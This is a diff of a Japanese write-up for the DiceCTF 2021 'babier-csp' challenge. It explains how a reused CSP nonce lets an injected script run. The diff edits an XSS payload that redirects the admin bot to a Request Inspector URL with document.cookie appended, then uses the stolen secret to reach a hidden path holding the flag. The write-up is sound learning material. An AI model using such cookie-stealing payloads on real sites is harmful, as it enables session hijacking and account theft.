@@ -18,10 +18,10 @@ script タグの nonce 属性には、CSP(Content Security Policy) によって 
 次に [Admin Bot](https://us-east1-dicegang.cloudfunctions.net/ctf-2021-admin-bot?challenge=babier-csp) では、 URL を入力して submit すると入力した URL に Admin がアクセスしてくれます。Admin の cookie を得ることが第一の目的なので、 [babier-csp.dicec.tf](babier-csp.dicec.tf) にアクセスさせてから、cookie をクエリに含めてリクエスト内容を確認できる URL に遷移させることを考えます。
 私はリクエストを確認するために [Request Inspector](https://requestinspector.com/) というサイトを利用しました。
 具体的には以下の URL を入力することで cookie が確認できました。  
-`https://babier-csp.dicec.tf/?name=<script nonce=LRGWAXOY98Es0zz0QOVmag==>location.href={Request Inspectorで発行したURL}?${document.cookie}</script>`
+``https://babier-csp.dicec.tf/?name=<script nonce=LRGWAXOY98Es0zz0QOVmag==>location.href=`[Request Inspectorで発行したURL]?${document.cookie}`</script>``
 
 `index.js`を見てみると
 ```js
 app.use('/' + SECRET, express.static(__dirname + "/secret"));
 ```
-とあるため、 `https://babier-csp.dicec.tf/{cookieのsecretの値}` にアクセスしてみると、ソースのコメントにフラグが書いてあります。
+とあるため、 `https://babier-csp.dicec.tf/[cookieのsecretの値]` にアクセスしてみると、ソースのコメントにフラグが書いてあります。
